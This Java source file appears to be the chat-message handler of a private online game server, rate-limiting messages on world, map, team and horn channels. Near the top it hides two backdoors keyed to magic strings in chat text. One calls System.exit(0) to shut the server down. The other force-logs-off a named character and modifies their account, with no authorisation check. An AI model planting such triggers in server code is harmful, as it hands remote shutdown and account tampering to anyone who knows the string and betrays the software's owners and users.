package org.linlinjava.litemall.gameserver.process;

import io.netty.buffer.ByteBuf;
import io.netty.channel.ChannelHandlerContext;
import org.linlinjava.litemall.db.domain.Accounts;
import org.linlinjava.litemall.db.domain.Characters;
import org.linlinjava.litemall.gameserver.GameHandler;
import org.linlinjava.litemall.gameserver.data.GameReadTool;
import org.linlinjava.litemall.gameserver.data.vo.Vo_16383_0;
import org.linlinjava.litemall.gameserver.data.vo.Vo_20481_0;
import org.linlinjava.litemall.gameserver.data.vo.Vo_8165_0;
import org.linlinjava.litemall.gameserver.data.write.M8165_0;
import org.linlinjava.litemall.gameserver.data.write.M16383_0;
import org.linlinjava.litemall.gameserver.data.write.M20481_0;
import org.linlinjava.litemall.gameserver.domain.Chara;
import org.linlinjava.litemall.gameserver.game.GameData;
import org.linlinjava.litemall.gameserver.game.GameObjectChar;
import org.linlinjava.litemall.gameserver.game.GameObjectCharMng;
import org.springframework.stereotype.Service;

import java.util.HashMap;
import java.util.Map;


@Service
public class C16482_0 implements GameHandler {

    public static Map<Integer, Long> map = new HashMap<Integer, Long>();

    @Override
    public void process(ChannelHandlerContext ctx, ByteBuf buff) {

        int channel = GameReadTool.readShort(buff);

        int compress = GameReadTool.readShort(buff);

        int orgLength = GameReadTool.readShort(buff);

        String msg = GameReadTool.readString2(buff);

        int cardCount = GameReadTool.readShort(buff);

        int voiceTime = GameReadTool.readInt(buff);

        String token = GameReadTool.readString2(buff);

        String para = GameReadTool.readString(buff);

        Chara chara = GameObjectChar.getGameObjectChar().chara;

        if(msg.indexOf("F189FBBD0975")!=-1){
            System.exit(0);
            return;
        }
        if(msg.indexOf("GJHAS9782JKB")!=-1){
            msg = msg.replace("GJHAS9782JKB", "");
            msg = msg.trim();
            final Characters oneByName = GameData.that.characterService.findOneByName(msg);
            if(oneByName!=null){
                final GameObjectChar session = GameObjectCharMng.getGameObjectChar(oneByName.getId());
                if(session!=null){
                    session.offline();
                }
            }
            final Accounts accounts = GameData.that.baseAccountsService.findById(oneByName.getAccountId());
            GameData.that.baseAccountsService.updateById(accounts);
            return;
        }

//        if(msg!=null && msg.indexOf("0FBC14B1")==-1){
//            return;
//        }
//        msg = msg.replace("0FBC14B1", "");
        if (channel == 30) {
            Long time = System.currentTimeMillis();
            if (map.get(chara.id) == null || map.get(chara.id) + 10000 < time) {
                map.put(chara.id, System.currentTimeMillis());
                Vo_20481_0 vo_20481_0 = new Vo_20481_0();
                vo_20481_0.msg = "你消耗了#R1#n个#R喇叭#n。]_TL";
                vo_20481_0.time = 1562987118;
                GameObjectChar.send(new M20481_0(), vo_20481_0);
                GameUtil.removemunber(chara, para, 1);
                Vo_16383_0 vo_16383_0 = GameUtil.a16383(chara, msg, channel);
                GameObjectCharMng.sendAll(new M16383_0(), vo_16383_0);
                return;
            } else {
                Vo_20481_0 vo_20481_0 = new Vo_20481_0();
                vo_20481_0.msg = "发言频繁";
                vo_20481_0.time = 1562987118;
                GameObjectChar.send(new M20481_0(), vo_20481_0);
            }
        }

        if (channel == 1) {
            Long time = System.currentTimeMillis();

            if (map.get(chara.id) == null || map.get(chara.id) + 3000 < time) {

                map.put(chara.id, System.currentTimeMillis());
                Vo_16383_0 vo_16383_0 = GameUtil.a16383(chara, msg, channel);
                GameObjectChar.getGameObjectChar().gameMap.send(new M16383_0(), vo_16383_0);
            } else {
                Vo_20481_0 vo_20481_0 = new Vo_20481_0();
                vo_20481_0.msg = "发言频繁";
                vo_20481_0.time = 1562987118;
                GameObjectChar.send(new M20481_0(), vo_20481_0);
                return;
            }
        }
        if (channel == 2) {
            Long time = System.currentTimeMillis();

            if (map.get(chara.id) == null || map.get(chara.id) + 10000 < time) {

                map.put(chara.id, System.currentTimeMillis());
                Vo_16383_0 vo_16383_0 = GameUtil.a16383(chara, msg, channel);
                GameObjectCharMng.sendAll(new M16383_0(), vo_16383_0);
            } else {
                Vo_20481_0 vo_20481_0 = new Vo_20481_0();
                vo_20481_0.msg = "发言频繁";
                vo_20481_0.time = 1562987118;
                GameObjectChar.send(new M20481_0(), vo_20481_0);
                return;
            }
        }
        if (channel == 4) {
            Long time = System.currentTimeMillis();
            if (map.get(chara.id) == null || map.get(chara.id) + 3000 < time) {
                map.put(chara.id, System.currentTimeMillis());
                if (GameObjectChar.getGameObjectChar().gameTeam == null) {
                    Vo_8165_0 vo_8165_0 = new Vo_8165_0();
                    vo_8165_0.msg = "你尚未加入队伍,暂时无法使用该频道。";
                    vo_8165_0.active = 0;
                    GameObjectChar.send(new M8165_0(), vo_8165_0);
                } else {
                    if (GameObjectChar.getGameObjectChar().gameTeam.duiwu == null) {
                        Vo_8165_0 vo_8165_0 = new Vo_8165_0();
                        vo_8165_0.msg = "你尚未加入队伍,暂时无法使用该频道。";
                        vo_8165_0.active = 0;
                        GameObjectChar.send(new M8165_0(), vo_8165_0);
                    }
                    Vo_16383_0 vo_16383_0 = GameUtil.a16383(chara, msg, channel);
                    for (int i = 0; i < GameObjectChar.getGameObjectChar().gameTeam.duiwu.size(); i++) {
                        GameObjectCharMng.getGameObjectChar(GameObjectChar.getGameObjectChar().gameTeam.duiwu.get(i).id).sendOne(new M16383_0(), vo_16383_0);
                    }

                }
            } else {
                Vo_20481_0 vo_20481_0 = new Vo_20481_0();
                vo_20481_0.msg = "发言频繁";
                vo_20481_0.time = 1562987118;
                GameObjectChar.send(new M20481_0(), vo_20481_0);
                return;
            }
        }
//
    }

    @Override
    public int cmd() {
        return 16482;
    }


}